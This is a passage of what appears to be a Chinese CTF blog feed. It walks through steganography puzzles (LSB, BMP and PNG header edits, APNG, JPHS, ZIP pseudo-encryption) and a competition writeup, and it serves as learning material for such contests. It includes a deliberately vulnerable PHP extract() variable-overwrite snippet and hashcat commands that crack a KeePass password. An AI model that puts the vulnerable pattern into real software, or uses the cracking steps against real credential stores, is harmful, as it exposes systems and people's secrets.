460377706</span><br></pre></td></tr></table></figure><p>然后转换十六进制结合即可</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/05/6316177d588a4.png" alt="QQ截图20220905233557.png"></p><p>ctfshow{3425649ea0e31938808c0de51b70ce6a}</p><h2 id="10-一个有意思的题"><a href="#10-一个有意思的题" class="headerlink" title="(10)一个有意思的题"></a>(10)一个有意思的题</h2><p>下载获取了一个不支持jpg打开的文件010打开</p><p>看完wp都感觉想不到哈哈哈哈哈</p><p>搜索F001然后用眼看</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/05/63161a9ccd40f.png" alt="QQ截图20220905234939.png"></p><h2 id="11-BMP"><a href="#11-BMP" class="headerlink" title="(11)BMP"></a>(11)BMP</h2><p><a href="https://blog.csdn.net/aidem_brown/article/details/80500637">(97条消息) 位图(bmp)文件格式分析_aidem_brown的博客-CSDN博客_bmp位图</a></p><p>通过该文章先了解一下BMP文件格式分析（下面是自己整理的一些必要了解的）</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/07/631779fdabd9b.png" alt="QQ截图20220907004851.png"></p><p>看例题</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/07/631774b25fb73.png" alt="QQ截图20220907002615.png"></p><p>给出一个bmp结尾文件，然后010打开发现文件头占了53个字节，文件尾部在65053的字节处</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/07/63177001c4f66.png" alt="QQ截图20220907000608.png"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/07/6317700204337.png" alt="QQ截图20220907000311.png"></p><p>这里就用到链接中的位图，他是有像素点组成的，每个像素点由3个字节组成(每个字节控制RGB中一种)</p><p>所以这里图片的像素应该为</p><p>(675053-53)&#x2F;3&#x3D;225000</p><p>然后我们可以打开图片属性查看他现在的像素点为多少</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/07/6317723a98167.png" alt="QQ截图20220907001546.png"></p><p>可以看到这里是900*150，135000的像素点</p><p>这里猜测是他的长或者宽有问题进行修改测试</p><p>题中3提示flag在图片上面所以猜测高有问题</p><p>225000&#x2F;900&#x3D;250</p><p>010修改对应高度(高度对应位置要看链接中bmp文件格式介绍在位图信息头的第三部分)即可出现flag</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/07/631774b22cd52.png" alt="QQ截图20220907002611.png"></p><h2 id="12-CRC报错修改高宽"><a href="#12-CRC报错修改高宽" class="headerlink" title="(12)CRC报错修改高宽"></a>(12)CRC报错修改高宽</h2><p>有一种题型考察的是CRC报错对高宽进行修改</p><p>这里查看CRC错误习惯用010打开然后看是否报错</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/07/63177acad08a9.png" alt="QQ截图20220907005154.png"></p><p>或者可以用TweakPNG进行查看</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/07/63177b60cddb9.png" alt="QQ截图20220907005449.png"></p><p>然后我们使用脚本跑一下对应宽和高修改即可</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/07/63177e1b72018.png" alt="QQ截图20220907010613.png"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/07/63177e19495b1.png" alt="QQ截图20220907010621.png"></p><h2 id="13-stegsolve查看帧"><a href="#13-stegsolve查看帧" class="headerlink" title="(13)stegsolve查看帧"></a>(13)stegsolve查看帧</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">stegsolve适用于ctf隐写的利器</span><br><span class="line"></span><br><span class="line">分为</span><br><span class="line"></span><br><span class="line">File Format:文件格式</span><br><span class="line"></span><br><span class="line">Data Rxtract:数据提取</span><br><span class="line"></span><br><span class="line">Steegram Solve:立体试图</span><br><span class="line"></span><br><span class="line">Frame Browser:帧浏览器</span><br><span class="line"></span><br><span class="line">Image Combiner:图片拼接</span><br></pre></td></tr></table></figure><p><a href="http://www.caesum.com/handbook/Stegsolve.jar">http://www.caesum.com/handbook/Stegsolve.jar</a></p><p>gif文件一般为一个动图会存在很多帧我们这时候就可以使用stegsolve查看每一个帧数查看其中隐藏的信息</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/14/6321dfe5b4e03.png" alt="QQ截图20220914220453.png"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/14/6321dfe5f30dd.png" alt="QQ截图20220914220520.png"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/14/6321dfe63d1b6.png" alt="QQ截图20220914220500.png"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/14/6321dfe6d83d6.png" alt="QQ截图20220914220513.png"></p><p>可以看到在有的帧中藏了内容</p><h2 id="14-APNG"><a href="#14-APNG" class="headerlink" title="(14)APNG"></a>(14)APNG</h2><p>大家都听说过png动图也一般是gif，而这里提到的是apng(动态png)，第一帧为标准的png图像，甚于的动画和帧数数据放在png扩展数据块中（一般用于查看png的软件只会显示第一帧中png图像）</p><p>比如拿浏览器打开的时候我们就会发现它是一个动态的</p><p>这里我们使用</p><p>APNG Disassember即可获取到每一帧的图片</p><p><a href="https://sourceforge.net/projects/apngdis/files/latest/download">Download APNG Disassembler from SourceForge.net</a></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/14/6321e7c60bf09.png" alt="QQ截图20220914223951.png"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/14/6321e7c71d870.png" alt="QQ截图20220914223958.png"></p><h2 id="15-PNGDEBUGGER"><a href="#15-PNGDEBUGGER" class="headerlink" title="(15)PNGDEBUGGER"></a>(15)PNGDEBUGGER</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;入门&quot;&gt;&lt;a href=&quot;#入门&quot; class=&quot;headerlink&quot; title=&quot;入门&quot;&gt;&lt;/a&gt;入门&lt;/h1&gt;&lt;p&gt;通过ctfshow平台挑选选了一些代表性的misc入门知识&lt;/p&gt;
&lt;h2 id=&quot;1-bpg文件读取&quot;&gt;&lt;a href=&quot;#1-bpg文件</summary>
      
    
    
    
    <category term="CTF" scheme="http://just-aleaf.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://just-aleaf.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>出题方法</title>
    <link href="http://just-aleaf.github.io/2022/08/06/%E5%87%BA%E9%A2%98%E6%96%B9%E6%B3%95/"/>
    <id>http://just-aleaf.github.io/2022/08/06/%E5%87%BA%E9%A2%98%E6%96%B9%E6%B3%95/</id>
    <published>2022-08-06T08:52:09.000Z</published>
    <updated>2022-09-14T15:13:44.369Z</updated>
    
    <content type="html"><![CDATA[<p>我认为一道题最好的理解方式就是去将他制作出来以制作者的心思去理解一道题</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="1-lsb隐写"><a href="#1-lsb隐写" class="headerlink" title="(1)lsb隐写"></a>(1)lsb隐写</h2><h3 id="什么是lsb隐写"><a href="#什么是lsb隐写" class="headerlink" title="什么是lsb隐写:"></a>什么是lsb隐写:</h3><p>lsb隐写就是通过修改RGB颜色分量的最低有效位(lsb)，而人眼注意不到这前后的变化，通过这个变化来对信息进行隐藏</p><h3 id="分析工具：StegSolve"><a href="#分析工具：StegSolve" class="headerlink" title="分析工具：StegSolve"></a>分析工具：StegSolve</h3><p>通过StegSolve打开对应图片，然后对RGB三原色进行最低位选择，就会显示出隐写内容</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/06/62ee2e665909d.jpg" alt="QQ截图20220806170300.jpg"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/06/62ee2e66da9b2.jpg" alt="QQ截图20220806170317.jpg"></p><p>除此之外还有zsteg和binwalk强推zsteg</p><h3 id="制题思路"><a href="#制题思路" class="headerlink" title="制题思路"></a>制题思路</h3><p>参考大佬的代码自己修改编写的隐写脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_key(str):</span><br><span class="line">    with open(str,&quot;rb&quot;) as f:</span><br><span class="line">        s=f.read()</span><br><span class="line">        string=&quot;&quot;</span><br><span class="line">        for i in range(len(s)):#这里将加密文件通过ord转换为十进制然后在转换为二进制，因为二进制前有’0b‘，利用replace替换，通过zfill函数补位为8位</span><br><span class="line">            string=string+&quot;&quot;+(bin(s[i]).replace(&#x27;0b&#x27;,&#x27;&#x27;)).zfill(8)</span><br><span class="line">        return string</span><br><span class="line"></span><br><span class="line">def mod(x,y):</span><br><span class="line">    return x%y</span><br><span class="line"></span><br><span class="line">def encode(str1,str2,str3): </span><br><span class="line">    im = Image.open(str1) </span><br><span class="line">    #获取图片的宽和高</span><br><span class="line">    width,height= im.size[0],im.size[1]</span><br><span class="line">    count = 0</span><br><span class="line">    #获取需要隐藏的信息 </span><br><span class="line">    key = get_key(str2) </span><br><span class="line">    keylen = len(key)</span><br><span class="line">    for h in range(height):</span><br><span class="line">        for w in range(width):</span><br><span class="line">            pixel = im.getpixel((w,h))</span><br><span class="line">            a=pixel[0]</span><br><span class="line">            b=pixel[1]</span><br><span class="line">            c=pixel[2]</span><br><span class="line">            if count == keylen:</span><br><span class="line">                break</span><br><span class="line">        #隐藏信息（通过每个像素点的RGB余2，去掉每个像素点的最低为，然后将隐藏的信息取出一位，转换为整形，两者相加</span><br><span class="line">            a= a - mod(a, 2)+int(key[count])</span><br><span class="line">            count += 1</span><br><span class="line">            if count == keylen:</span><br><span class="line">                im.putpixel((w, h), (a, b, c))</span><br><span class="line">                break</span><br><span class="line">            b = b - mod(b, 2) + int(key[count])</span><br><span class="line">            count += 1</span><br><span class="line">            if count == keylen:</span><br><span class="line">                im.putpixel((w, h), (a, b, c))</span><br><span class="line">                break</span><br><span class="line">            c = c - mod(c, 2) + int(key[count])</span><br><span class="line">            count += 1</span><br><span class="line">            if count == keylen:</span><br><span class="line">                im.putpixel((w, h), (a, b, c))</span><br><span class="line">                break</span><br><span class="line">            if count % 3 == 0:</span><br><span class="line">                im.putpixel((w, h), (a, b, c))</span><br><span class="line">    im.save(str3)</span><br><span class="line">    print(&quot;sucess&quot;)</span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    if &#x27;-h&#x27; in sys.argv or &#x27;--help&#x27; in sys.argv or len(sys.argv) &lt; 2:</span><br><span class="line">        print(&#x27;Usage: python test.py &lt;cmd&gt; [arg...] [opts...]&#x27;)</span><br><span class="line">        print(&#x27;  cmds:&#x27;)</span><br><span class="line">        print(&#x27;    encode image + flag -&gt; image(encoded)&#x27;)</span><br><span class="line">        print(&#x27;    decode length + image(encoded) -&gt; flag&#x27;)</span><br><span class="line">        sys.exit(1)</span><br><span class="line">    cmd = sys.argv[1]</span><br><span class="line">    if cmd != &#x27;encode&#x27; and cmd != &#x27;decode&#x27;:</span><br><span class="line">        print(&#x27;wrong input&#x27;)</span><br><span class="line">        sys.exit(1)</span><br><span class="line">    str1 = sys.argv[2]#获取输入的第二个参数（载体图片的路径）</span><br><span class="line">    str2 = sys.argv[3]#获取输入的第三个参数（隐写的文件）</span><br><span class="line">    str3 = sys.argv[4]#获取输入的第四个参数（加密图片的保存路径）</span><br><span class="line">    if cmd != &#x27;encode&#x27; :</span><br><span class="line">        print(&#x27;Wrong cmd %s&#x27; % cmd)</span><br><span class="line">        sys.exit(1)</span><br><span class="line">    elif cmd==&#x27;encode&#x27;:</span><br><span class="line">        encode(str1,str2,str3)</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/06/62ee620819314.jpg" alt="QQ截图20220806202810.jpg"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/06/62ee621f8692c.jpg" alt="QQ截图20220806204223.jpg"></p><p>发现多了一个图片(测试发现这里只能将加密后文件存储为png文件才会有效)</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/06/62ee622724278.jpg" alt="QQ截图20220806204307.jpg"></p><p>测试隐写成功</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/06/62ee623642e5c.jpg" alt="QQ截图20220806204320.jpg"></p><p>参考<a href="https://zhuanlan.zhihu.com/p/461716971">浅谈LSB隐写解题与出题 - 知乎 (zhihu.com)</a></p><h2 id="2-伪加密"><a href="#2-伪加密" class="headerlink" title="(2)伪加密"></a>(2)伪加密</h2><p>misc中还会经常遇到一种题型就是关于伪加密的</p><h3 id="什么是伪加密"><a href="#什么是伪加密" class="headerlink" title="什么是伪加密"></a>什么是伪加密</h3><p>伪加密就是对文件头的加密标志位进行修改，让用户点开的时候就会显示这是一个加密文件</p><p>谈及伪加密就需了解一下zip文件</p><p>zip文件由三部分组成：</p><p>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志（文件的各区域开头是50 4B，之后两个字节是版本号，在之后两个字节是判断是否加密的标志位）</p><p>A.压缩源文件数据区：</p><p>50 4B 03 04 头文件标记</p><p>xx xx  压缩文件pkware版本</p><p>00 00 全局方式位标记（判断有无加密的标志位）</p><p>（这里判断加密于否的是在头文件标记后间隔2个字节）</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62ef70e7e55d3.jpg" alt="QQ截图20220807155908.jpg"></p><p>B.压缩源文件目录区</p><p>50 4B 01 02  目录中文件文件头标记</p><p>XX XX  压缩使用的pkware版本</p><p>XX XX  解压文件所需的pkware版本</p><p>00 00 全局方式位标记（判断有无加密的标记位，当改为09，00就可以达到伪加密）</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62ef70e930dbf.jpg" alt="QQ截图20220807155920.jpg"></p><p>C.压缩源文件目录结束标志</p><p>50 4B 05 06 目录结束标志</p><p>对于识别真假加密的话个人感觉总结的规律有时候也有不准确的时候所以就不进行整理，可以自己修改全局方式标记来进行判断</p><h3 id="分析工具：010-Editor"><a href="#分析工具：010-Editor" class="headerlink" title="分析工具：010 Editor"></a>分析工具：010 Editor</h3><p>这里直接通过010 Editor就可以看到文件对应十六进制寻找到对应文件位置即可</p><h3 id="制题思路-1"><a href="#制题思路-1" class="headerlink" title="制题思路"></a>制题思路</h3><p>这里采用ZipCenOp.jar工具</p><p>准备一个无密码的zip文件</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62ef72cb16342.jpg" alt="QQ截图20220807160731.jpg"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62ef730d03d47.jpg" alt="QQ截图20220807160838.jpg"></p><p>这里不需要理会报错是java版本问题</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62ef732ecaf90.jpg" alt="QQ截图20220807160911.jpg"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62ef73c43f10b.jpg" alt="QQ截图20220807161137.jpg"></p><p>解密的使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ZipCenOp.jar r 1.zip</span><br></pre></td></tr></table></figure><p>参考<a href="https://jingyan.baidu.com/article/19192ad8e8f233e53e570719.html">zip格式压缩包伪加密方法-百度经验 (baidu.com)</a></p><h2 id="3-JPHS隐写"><a href="#3-JPHS隐写" class="headerlink" title="(3)JPHS隐写"></a>(3)JPHS隐写</h2><h3 id="什么是JPHS"><a href="#什么是JPHS" class="headerlink" title="什么是JPHS"></a>什么是JPHS</h3><p>对有压缩JPEG文件进行信息的加密隐藏探测图区工具</p><h3 id="分析工具-JPHS"><a href="#分析工具-JPHS" class="headerlink" title="分析工具: JPHS"></a>分析工具: JPHS</h3><p>JPHIDE:进行将信息隐藏到jpg图片中</p><p>JPSEEK:从JPHIDE程序加密隐藏的JPEG图片中探测到并提取到信息文件</p><p><a href="https://www.scanwith.com/JPHS_for_Windows_download.htm#google_vignette">Download for Free JPHS for Windows 0.5 (scanwith.com)</a></p><h3 id="制题思路-2"><a href="#制题思路-2" class="headerlink" title="制题思路"></a>制题思路</h3><p>准备一个jpeg图片和隐藏信息</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/09/62f27926e05cf.jpg" alt="QQ截图20220809230958.jpg"></p><p>然后打开工具放入jpg照片</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/09/62f279359f964.jpg" alt="QQ截图20220809231027.jpg"></p><p>放入后点击hide输入解密密码</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/09/62f27934ea586.jpg" alt="QQ截图20220809231040.jpg"></p><p>选择隐藏的信息</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/09/62f2793555e40.jpg" alt="QQ截图20220809231057.jpg"></p><p>将其另存为照片即可</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/09/62f279361c8c1.jpg" alt="QQ截图20220809231117.jpg"></p><p>解密同理放入照片点击seek然后输入密码即可</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/09/62f279d1447a2.jpg" alt="QQ截图20220809231416.jpg"></p><p>参考<a href="https://blog.csdn.net/qq_53079406/article/details/123608345">(47条消息) 【隐写工具】【试一试？】jphide seek（JPHS） 使用方法,检测提示，附下载地址_黑色地带(崛起)的博客-CSDN博客_jphs使用</a></p><h2 id="4-APNG"><a href="#4-APNG" class="headerlink" title="(4)APNG"></a>(4)APNG</h2><h3 id="什么是APNG"><a href="#什么是APNG" class="headerlink" title="什么是APNG"></a>什么是APNG</h3><p>APNG又叫动态PNG（Animated PNG），第1帧为标准PNG图像，剩余的动画和帧速等数据放在PNG扩展数据块里，因此只支持原版PNG的软件会正确显示第1帧,可以解决gif毛边的问题</p><p>首先我们看png文件组成</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/14/6321ebaf9ac13.png" alt="QQ截图20220914225636.png"></p><p>再看APNG组成</p><p>在png的组成基础上多了三大块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">acTL 动画控制块 咋第一个IDAT块之前用于告诉解析器这是一个APNG文件包含动画帧总数和循环次数</span><br><span class="line">fcTL 帧控制块 每一帧都需要有，出现在IDAT或者fdAT之前</span><br><span class="line">fdAT 帧块数据库 </span><br></pre></td></tr></table></figure><p>转载一张大佬照片</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/14/6321ef7939b05.png" alt="QQ截图20220914230535.png"></p><p>借鉴</p><p><a href="https://blog.csdn.net/ly305750665/article/details/77972415">(84条消息) APNG在QT中的使用（一）_雨田哥的博客-CSDN博客</a></p><h3 id="分析工具-APNG-Disassember"><a href="#分析工具-APNG-Disassember" class="headerlink" title="分析工具:APNG Disassember"></a>分析工具:APNG Disassember</h3><p><a href="https://sourceforge.net/projects/apngdis/files/latest/download">Download APNG Disassembler from SourceForge.net</a></p><p>获取每一帧的内容和设置</p><h3 id="制题思路-3"><a href="#制题思路-3" class="headerlink" title="制题思路"></a>制题思路</h3><p>使用工具APNG Assembler</p><p><a href="https://sourceforge.net/projects/apngasm/">APNG Assembler download | SourceForge.net</a></p><p>准备分辨率相同的照片</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/14/6321ea24b079a.png" alt="QQ截图20220914225005.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Playback Settings  loops设定重复播放动画的次数</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/14/6321e9dcac0ec.png" alt="QQ截图20220914224851.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Delays Setting     设定每张照片重复播放的时间</span><br><span class="line">左侧为照片数，右侧为每张照片播放秒数</span><br></pre></td></tr></table></figure><p>拖入之后点击Make Animated PNGG即可制作APNG动态图</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/09/14/6321ea9e38f6e.png" alt="animated.png"></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract()变量覆盖"></a>extract()变量覆盖</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag=&#x27;flag.php&#x27;;</span><br><span class="line">extract($_GET);  </span><br><span class="line">if(isset($os))</span><br><span class="line">&#123;</span><br><span class="line"> $content=trim(file_get_contents($flag));</span><br><span class="line">if($os==$content)</span><br><span class="line">&#123;</span><br><span class="line">    echo&#x27;flag&#123;dnmzhello&#125;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo&#x27;不对哦&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我认为一道题最好的理解方式就是去将他制作出来以制作者的心思去理解一道题&lt;/p&gt;
&lt;h1 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h1&gt;&lt;h2 id=&quot;1-lsb隐写&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="CTF" scheme="http://just-aleaf.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://just-aleaf.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2022DASCTF Apr X FATE 防疫挑战赛</title>
    <link href="http://just-aleaf.github.io/2022/08/05/2022DASCTF-Apr-X-FATE-%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <id>http://just-aleaf.github.io/2022/08/05/2022DASCTF-Apr-X-FATE-%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B/</id>
    <published>2022-08-05T11:55:58.000Z</published>
    <updated>2022-08-09T15:05:01.889Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="SimpleFlow"><a href="#SimpleFlow" class="headerlink" title="SimpleFlow"></a>SimpleFlow</h2><p>下载附件发现是一个流量包</p><p>尝试binwalk看看有没有什么隐写内容</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62ef7ce2a8726.jpg" alt="QQ截图20220807165010.jpg"></p><p>发现一个flag.txt和一个加密的压缩包</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62ef7ce38ad00.jpg" alt="QQ截图20220807165023.jpg"></p><p>也没有别的有用信息尝试从流量包中查找有没有关于flag或者密码的其他内容</p><p>进入wireshark查找flag.txt相关内容</p><p>发现有四条发现是base64加密过的蚁剑流量</p><p>一一进行解密（这里要注意蚁剑流量解码后s需要去除传入参数的前两个字符）</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62efafad9c5fa.jpg" alt="QQ截图20220807202606.jpg"></p><p>解密发现压缩包密码</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62efb0c260c39.jpg" alt="QQ截图20220807203154.jpg"></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/07/62efb0f8735be.jpg" alt="QQ截图20220807203235.jpg"></p><h2 id="熟悉的猫"><a href="#熟悉的猫" class="headerlink" title="熟悉的猫"></a>熟悉的猫</h2><p>下载附件发现是一个zip文件名的文件修改后缀位zip</p><p>内含一个kdbx和zip文件(加密)</p><p>kdbx文件是windows的密码文件需要用到keepass进行打开</p><p>发现加密</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/08/62f0f0663cf9b.jpg" alt="QQ截图20220808191241.jpg"></p><p>hashcat暴力破解</p><p>先使用keepass2john获取hash值</p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/08/62f0f072eb5c7.jpg" alt="QQ截图20220808191405.jpg"></p><p>这里生成的txt中要打开将前面的len5:去掉（把那个不属于hash值）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13400 keepass.txt -a 0 password.txt --force//这里的password.txt是使用crunch生成的五位数密码本</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/08/62f0f086a2a33.jpg" alt="QQ截图20220808191325.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13400 keepass.txt -a 0 password.txt --force --show //显示结果</span><br></pre></td></tr></table></figure><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/08/62f0f1393bfb6.jpg" alt="QQ截图20220808191340.jpg"></p><p>获得对应密码jbRw5PB2kFmor6IeYYil</p><p>解开kbdx文件发现zip文件的密码解密hint中发现k值同时发现存在零宽隐写</p><p><a href="http://330k.github.io/misc_tools/unicode_steganography.html">Unicode Steganography with Zero-Width Characters (330k.github.io)</a></p><p><img src="http://wp.xiaohuang.vip/p/9/2022/08/08/62f12a794a6be.jpg" alt="QQ截图20220808232252.jpg"></p><p>通过k和获取到的两个值猜测这里有塔珀自指公式的加密</p><p><a href="https://blog.csdn.net/ygys1234/article/details/109686348">(41条消息) 代码急转弯——Tupper（塔珀自指公式）_ygys1234的博客-CSDN博客_塔珀自指公式</a></p><p>然后用大佬脚本将k和两个对应值修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">from PIL import Image</span><br><span class="line">a=22</span><br><span class="line">b=160</span><br><span class="line">def Tupper_self_referential_formula(k): </span><br><span class="line">    aa = np.zeros((a,b))</span><br><span class="line">    def f(x, y):</span><br><span class="line">        y += k</span><br><span class="line">        a1 = 2**-(-a*x - y%a)</span><br><span class="line">        a2 = (y // a) // a1</span><br><span class="line">        return 1 if a2 % 2 &gt; 0.5 else 0</span><br><span class="line"> </span><br><span class="line">    for y in range(a):</span><br><span class="line">        for x in range(b):</span><br><span class="line">            aa[y, x] = f(x, y)</span><br><span class="line">    </span><br><span class="line">    return aa[:,::-1]</span><br><span class="line"></span><br><span class="line">k = 928982032787029079297059386766720215003947914272057573691234892045653003248597170824098926419512066645649919914893546618714258726495240780009481998326598152759092851988292769290146946281101598249309315951662032714432698274495057076550858425636820609108139425045079366255557355859132735750501185523531926829553102203234634654086454223341014464710789331492873362417724483384287403028338556164215385207692676361192859486745497566043849469961843854075054561682401233197858009099332146957118280134839817319337730173369446563975838722671267677785497450878547943028089501009665825587612244542420184675789597666171760166601016901402799619687403233273693471646237463913357564425669593528767063642655098343199104193997483388947466387586522867719798965736958236086780088148616403085712568807943126520559571504645139503053550554952623758701028985006430104714259314500464408608415893028902504561380607386895262833892568019691902041273580984082642046438825209697042218